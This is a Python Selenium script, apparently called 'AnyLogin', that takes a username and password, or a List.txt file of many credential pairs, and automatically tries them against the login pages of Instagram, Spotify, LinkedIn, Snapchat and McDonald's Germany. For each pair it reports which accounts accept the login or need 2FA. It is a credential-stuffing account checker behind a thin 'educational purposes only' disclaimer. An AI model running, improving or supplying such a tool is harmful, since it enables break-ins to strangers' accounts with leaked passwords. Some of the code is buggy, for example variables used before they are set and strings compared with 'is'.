from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from webdriver_manager.firefox import GeckoDriverManager
import time

# Firefox Settings
options = webdriver.FirefoxOptions()
options.add_argument("--headless")
options.set_preference("intl.accept_languages", "en-US, en")


#Terminal
print("""
      .o.                               ooooo                              o8o              
     .888.                              `888'                              `"'              
    .8"888.     ooo. .oo.   oooo    ooo  888          .ooooo.   .oooooooo oooo  ooo. .oo.   
   .8' `888.    `888P"Y88b   `88.  .8'   888         d88' `88b 888' `88b  `888  `888P"Y88b  
  .88ooo8888.    888   888    `88..8'    888         888   888 888   888   888   888   888  
 .8'     `888.   888   888     `888'     888       o 888   888 `88bod8P'   888   888   888  
o88o     o8888o o888o o888o     .8'     o888ooooood8 `Y8bod8P' `8oooooo.  o888o o888o o888o 
                            .o..P'                             d"     YD                    
                            `Y8P'                              "Y88888P'                    
""")
print("""  ____          ____        _              _    _       _           
 | __ ) _   _  | __ )  __ _| |__  _   _   / \  | |_ __ | |__   __ _ 
 |  _ \| | | | |  _ \ / _` | '_ \| | | | / _ \ | | '_ \| '_ \ / _` |
 | |_) | |_| | | |_) | (_| | |_) | |_| |/ ___ \| | |_) | | | | (_| |
 |____/ \__, | |____/ \__,_|_.__/ \__, /_/   \_\_| .__/|_| |_|\__,_|
        |___/                     |___/          |_|      
      """) 

print("\nDisclaimer: This script is for educational purposes only. Use responsibly and ethically.")
print("\nThis is the first version, so it only features a few Sides for now.\nI will add way more in the future.\nPlease Star it on Github\nEnjoy \n")


username = input("Enter the username: ")
passwword = input("Enter the password: ")
version_input = input("One User or multiple User Version? (1/2):\n(Choose '2' to give it a List) ")
Germany_input = input("Include German sites? (y/n):\n(only use on German Ip address)").lower()

if Germany_input == 'y':
    Germany = True
else:
    Germany = False

if version_input == '2':
   results = []
   with open("List.txt", "r") as file:
    for line in file:
        parts = line.split()
        if len(parts) >= 2:
            first, second = parts[0], parts[1]
            username = first
            passwword = second
            #instagram
            print("starting Firefox...")
            driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()), options=options)
            print("Trying Instagram...")
            driver.get("https://www.instagram.com/accounts/login/")
            time.sleep(5)

            try:
                cookies_btn = driver.find_element(By.XPATH, "//button[text()='Allow all cookies']")
                cookies_btn.click()
                print("Cookies accepted")
                time.sleep(2)
            except:
                print("No cookie popup found")


            username_field = driver.find_element(By.NAME, "username")
            password_field = driver.find_element(By.NAME, "password")

            username_field.send_keys(username)
            password_field.send_keys(passwword)
            password_field.send_keys(Keys.RETURN)
            time.sleep(7)

            current_url = driver.current_url.lower()
            try:
                twofa_field = driver.find_element(By.NAME, "verificationCode")
                print("Instagram = Login found, but 2FA is required.")
            except:
                twofa_field = None

            if twofa_field:
                pass  
            elif "login" in current_url:
                print("Instagram = Login failed")
                Instagram = False
            else:
                print("Instagram = Login successful!")
                Instagram = True

            #spotify
            print("Trying Spotify...")
            driver.get("https://accounts.spotify.com/en/login")
            time.sleep(3)
            try:
                cookie_button1 = driver.find_element(By.ID, "onetrust-accept-btn-handler")
                cookie_button1.click()
                time.sleep(1)
                print("Cookies accepted")
            except:
                pass
                print("No cookie popup found")

            username_field1 = driver.find_element(By.ID, "login-username")
            username_field1.send_keys(username)
            time.sleep(5)
            continue_btn = driver.find_element(By.ID, "login-button")
            continue_btn.click()
            time.sleep(3)

            try:
                password_field1 = driver.find_element(By.ID, "login-password")
                password_field1.send_keys(passwword, Keys.RETURN)
                time.sleep(5)

                if "login" in driver.current_url:
                    print("Spotify = Login failed")
                    spotify = False
                else:
                    print("Spotify = Login successful!")
                    spotify = True

            except:
                print("Spotify = 2FA required, not asked for Password")
                twofa_field1 = True

            #linkedIn
            print("Trying LinkedIn...")
            driver.get("https://www.linkedin.com/login")
            time.sleep(3)
            try:
                cookie_button2 = driver.find_element(By.XPATH, "//button[text()='Accept All Cookies']")
                cookie_button2.click()
                time.sleep(1)
                print("Cookies accepted")
            except:
                print("No cookie popup found")

            username_field2 = driver.find_element(By.ID,"username")
            password_field2 = driver.find_element(By.ID, "password")

            username_field2.send_keys(username)
            password_field2.send_keys(passwword)
            password_field2.send_keys(Keys.RETURN)
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            time.sleep(5)

            try:
                twofa_field2 = driver.find_element(By.ID, "id_verificationCode")
                print("LinkedIn = Login found, but 2FA is required.")
            except:
                twofa_field2 = None

            if twofa_field2:
                pass   
            elif "login" in driver.current_url:
                print("LinkedIn = Login failed")
                linkedin = False
            else:
                print("LinkedIn = Login successful!")
                linkedin = True

            #Snapchat
            print("Trying Snapchat...")
            driver.get("https://accounts.snapchat.com/v2/login")
            time.sleep(3)
            try:
                cookie_button3 = driver.find_element(By.XPATH, "//button[text()='Accept All']")
                cookie_button3.click()
                time.sleep(1)
                print("Cookies accepted")
            except:
                print("No cookie popup found")

            username_field4 = driver.find_element(By.ID, "username")
            username_field4.send_keys(username)
            try: 
                usertest = driver.find_element(By.ID, "username")
                print("Snapchat = Login failed")
                snapchat = False
            except:
             pass

            time.sleep(5)

            if snapchat is False:
                pass
            else:
                password_field4 = driver.find_element(By.NAME, "password")
                password_field4.send_keys(passwword)
                password_field4.send_keys(Keys.RETURN)
                time.sleep(5)

            try : 
                twofa_field3 = driver.find_element(By.ID, "phone_number")
                print("Snapchat = Login found, but 2FA is required.")
                snapchat = False
            except:
                twofa_field3 = None

            if twofa_field3:
                pass
            elif "login" in driver.current_url:
                print("Snapchat = Login failed")
                snapchat = False   
            else:
                print("Snapchat = Login successful!")
                snapchat = True

            #Germany
            if Germany is True:
                #McDonalds
                print("Trying McDonalds...")
                driver.get("https://www.mcdonaldsapps.com/account")
                time.sleep(3)
                try:
                    cookie_button = driver.find_element(By.XPATH, "//button[text()='Alle akzeptieren']")
                    cookie_button.click()
                    time.sleep(1)
                    print("Cookies accepted")
                except:
                    print("No cookie popup found")
                time.sleep(2)
                username_field3 = driver.find_element(By.NAME, "username")
                password_field3 = driver.find_element(By.ID, ":r1:")
                username_field3.send_keys(username)
                password_field3.send_keys(passwword)
                password_field3.send_keys(Keys.RETURN)
                time.sleep(5)
                if "account" in driver.current_url:
                  print("McDonalds = Login failed")
                  mcdonalds = False
                else:
                  print("McDonalds = Login successful!\n2FA not checked")
                  mcdonalds = True
            else:
                mcdonalds = "N"

            driver.quit()

            #Endlist
            if twofa_field is True:
                instaende = "Y(2FA)"
            elif Instagram is True:
                instaende = "Y"
            else:
                instaende = "N"

            if twofa_field1 is True:
                spotifyende = "Y(2FA)" 
            elif spotify is True:
                spotifyende = "Y"
            else:
                spotifyende = "N"

            if twofa_field2 is True:
                linkedinende = "Y(2FA)"
            elif linkedin is True:
                linkedinende = "Y"
            else:
                linkedinende = "N"

            if mcdonalds is True:
                mcdonaldsende = "Y"
            elif mcdonalds is "N":
                mcdonaldsende = "N/A"
            else:
                mcdonaldsende = "N"

            if twofa_field3 is True:
                snapchatende = "Y(2FA)"
            elif snapchat is True:
                snapchatende = "Y"
            else:
                snapchatende = "N"
            
            results.append(f"{username} with {passwword}: Instagram: {instaende} Spotify: {spotifyende} Linkedin: {linkedinende} McDonalds: {mcdonaldsende} Snapchat: {snapchatende}") 
   for i, (f) in enumerate(results, start=1):
     print(f"{i}. {f}")
   print("Press console key to exit.")
   exit()


else:
 pass

#Insta 
print("starting Firefox...")
driver = webdriver.Firefox(service=Service(GeckoDriverManager().install()), options=options)
print("Trying Instagram...")
driver.get("https://www.instagram.com/accounts/login/")
time.sleep(5)

try:
    cookies_btn = driver.find_element(By.XPATH, "//button[text()='Allow all cookies']")
    cookies_btn.click()
    print("Cookies accepted")
    time.sleep(2)
except:
    print("No cookie popup found")


username_field = driver.find_element(By.NAME, "username")
password_field = driver.find_element(By.NAME, "password")

username_field.send_keys(username)
password_field.send_keys(passwword)
password_field.send_keys(Keys.RETURN)
time.sleep(7)

current_url = driver.current_url.lower()
try:
    twofa_field = driver.find_element(By.NAME, "verificationCode")
    print("Instagram = Login found, but 2FA is required.")
except:
    twofa_field = None

if twofa_field:
    pass  
elif "login" in current_url:
    print("Instagram = Login failed")
    Instagram = False
else:
    print("Instagram = Login successful!")
    Instagram = True

#spotify
print("Trying Spotify...")
driver.get("https://accounts.spotify.com/en/login")
time.sleep(3)
try:
    cookie_button1 = driver.find_element(By.ID, "onetrust-accept-btn-handler")
    cookie_button1.click()
    time.sleep(1)
    print("Cookies accepted")
except:
    pass
    print("No cookie popup found")

username_field1 = driver.find_element(By.ID, "login-username")
username_field1.send_keys(username)
time.sleep(5)
continue_btn = driver.find_element(By.ID, "login-button")
continue_btn.click()
time.sleep(3)

try:
    password_field1 = driver.find_element(By.ID, "login-password")
    password_field1.send_keys(passwword, Keys.RETURN)
    time.sleep(5)

    if "login" in driver.current_url:
        print("Spotify = Login failed")
        spotify = False
    else:
        print("Spotify = Login successful!")
        spotify = True

except:
    print("Spotify = 2FA required, not asked for Password")
    twofa_field1 = True

#linkedIn
print("Trying LinkedIn...")
driver.get("https://www.linkedin.com/login")
time.sleep(3)
try:
    cookie_button2 = driver.find_element(By.XPATH, "//button[text()='Accept All Cookies']")
    cookie_button2.click()
    time.sleep(1)
    print("Cookies accepted")
except:
    print("No cookie popup found")

username_field2 = driver.find_element(By.ID,"username")
password_field2 = driver.find_element(By.ID, "password")

username_field2.send_keys(username)
password_field2.send_keys(passwword)
password_field2.send_keys(Keys.RETURN)
driver.find_element(By.XPATH, "//button[@type='submit']").click()
time.sleep(5)

try:
    twofa_field2 = driver.find_element(By.ID, "id_verificationCode")
    print("LinkedIn = Login found, but 2FA is required.")
except:
    twofa_field2 = None

if twofa_field2:
    pass   
elif "login" in driver.current_url:
    print("LinkedIn = Login failed")
    linkedin = False
else:
    print("LinkedIn = Login successful!")
    linkedin = True

#Snapchat
print("Trying Snapchat...")
driver.get("https://accounts.snapchat.com/v2/login")
time.sleep(3)
try:
    cookie_button3 = driver.find_element(By.XPATH, "//button[text()='Accept All']")
    cookie_button3.click()
    time.sleep(1)
    print("Cookies accepted")
except:
    print("No cookie popup found")

username_field4 = driver.find_element(By.ID, "username")
username_field4.send_keys(username)
try: 
    usertest = driver.find_element(By.ID, "username")
    print("Snapchat = Login failed")
    snapchat = False
except:
   pass
time.sleep(5)

if snapchat is False:
    pass
else:
     password_field4 = driver.find_element(By.NAME, "password")
     password_field4.send_keys(passwword)
     password_field4.send_keys(Keys.RETURN)
     time.sleep(5)

try : 
    twofa_field3 = driver.find_element(By.ID, "phone_number")
    print("Snapchat = Login found, but 2FA is required.")
    snapchat = False
except:
    twofa_field3 = None

if twofa_field3:
    pass
elif "login" in driver.current_url:
    print("Snapchat = Login failed")
    snapchat = False   
else:
    print("Snapchat = Login successful!")
    snapchat = True

#Germany
if Germany is True:
    #McDonalds
    print("Trying McDonalds...")
    driver.get("https://www.mcdonaldsapps.com/account")
    time.sleep(3)
    try:
       cookie_button = driver.find_element(By.XPATH, "//button[text()='Alle akzeptieren']")
       cookie_button.click()
       time.sleep(1)
       print("Cookies accepted")
    except:
       print("No cookie popup found")
    time.sleep(2)
    username_field3 = driver.find_element(By.NAME, "username")
    password_field3 = driver.find_element(By.ID, ":r1:")
    username_field3.send_keys(username)
    password_field3.send_keys(passwword)
    password_field3.send_keys(Keys.RETURN)
    time.sleep(5)
    if "account" in driver.current_url:
       print("McDonalds = Login failed")
       mcdonalds = False
    else:
        print("McDonalds = Login successful!\n2FA not checked")
        mcdonalds = True
else:
    mcdonalds = "N"

driver.quit()

#Endlist
if twofa_field is True:
    instaende = "Login found, but 2FA is required."
elif Instagram is True:
    instaende = "Login successful!"
else:
    instaende = "Login failed"

if twofa_field1 is True:
    spotifyende = "2FA required, not asked for Password" 
elif spotify is True:
    spotifyende = "Login successful!"
else:
    spotifyende = "Login failed"

if twofa_field2 is True:
    linkedinende = "Login found, but 2FA is required."
elif linkedin is True:
    linkedinende = "Login successful!"
else:
    linkedinende = "Login failed"

if mcdonalds is True:
    mcdonaldsende = "Login successful!"
elif mcdonalds is "N":
    mcdonaldsende = "N/A"
else:
    mcdonaldsende = "Login failed"

if twofa_field3 is True:
    snapchatende = "Login found, but 2FA is required."
elif snapchat is True:
    snapchatende = "Login successful!"
else:
    snapchatende = "Login failed"

input(f"""
Result for {username} with {passwword}:
Instagram: {instaende}
Spotify: {spotifyende}
Linkedin: {linkedinende}
McDonalds: {mcdonaldsende}
Snapchat: {snapchatende}
Press Enter to exit.""")

print("Press console key to exit.")
exit()